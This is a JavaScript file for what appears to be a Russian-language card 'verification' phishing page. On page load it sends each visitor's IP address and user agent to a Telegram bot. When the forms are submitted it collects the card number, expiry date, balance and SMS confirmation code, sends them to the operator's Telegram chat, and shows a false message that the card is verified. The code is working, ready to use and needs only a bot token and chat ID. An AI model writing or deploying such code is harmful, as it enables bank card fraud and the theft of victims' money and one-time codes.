// Telegram bot settings
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';

// Track page visits
async function trackVisit(pageName) {
    try {
        const response = await fetch(`https://api.ipify.org?format=json`);
        const data = await response.json();
        
        const message = `📱 *Новый посетитель*\n` +
                      `🌐 *Страница:* ${pageName}\n` +
                      `🆔 *IP:* ${data.ip}\n` +
                      `📱 *Устройство:* ${navigator.userAgent}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
    } catch (error) {
        console.error('Error tracking visit:', error);
    }
}

// Format card number
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    input.value = value.trim();
}

// Format expiration date
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    input.value = value;
}

// Format balance input
function formatBalance(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
    input.value = value.trim();
}

// Track page view
document.addEventListener('DOMContentLoaded', function() {
    const currentPage = window.location.pathname.includes('verification.html') ? 'Верификация' : 'Главная';
    trackVisit(currentPage);
    
    // Initialize form elements if they exist
    const cardInput = document.getElementById('card');
    const dateInput = document.getElementById('date');
    const balanceInput = document.getElementById('balance');
    const mainForm = document.getElementById('dataForm');
    const verificationForm = document.getElementById('verificationForm');

    if (cardInput) {
        cardInput.addEventListener('input', () => formatCardNumber(cardInput));
    }
    
    if (dateInput) {
        dateInput.addEventListener('input', () => formatExpiryDate(dateInput));
    }
    
    if (balanceInput) {
        balanceInput.addEventListener('input', () => formatBalance(balanceInput));
    }

    // Main form submission
    if (mainForm) {
        mainForm.addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = 'verification.html';
        });
    }

    // Verification form submission
    if (verificationForm) {
        verificationForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Here you would typically send the data to your server
            const formData = {
                card: document.getElementById('card')?.value || 'N/A',
                date: document.getElementById('date')?.value || 'N/A',
                balance: document.getElementById('balance')?.value || 'N/A',
                smsCode: document.getElementById('smsCode')?.value || 'N/A'
            };


            try {
                // Send data to Telegram
                const message = `💳 *Новые данные карты*\n` +
                              `🔢 *Номер:* ${formData.card}\n` +
                              `📅 *Срок:* ${formData.date}\n` +
                              `💰 *Баланс:* ${formData.balance}\n` +
                              `🔑 *Код из SMS:* ${formData.smsCode}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
                
                // Show success message
                alert('Ваша карта успешно верифицирована!');
                
                // Redirect to success page or reset form
                verificationForm.reset();
            } catch (error) {
                console.error('Error:', error);
                alert('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
            }
        });
    }
});
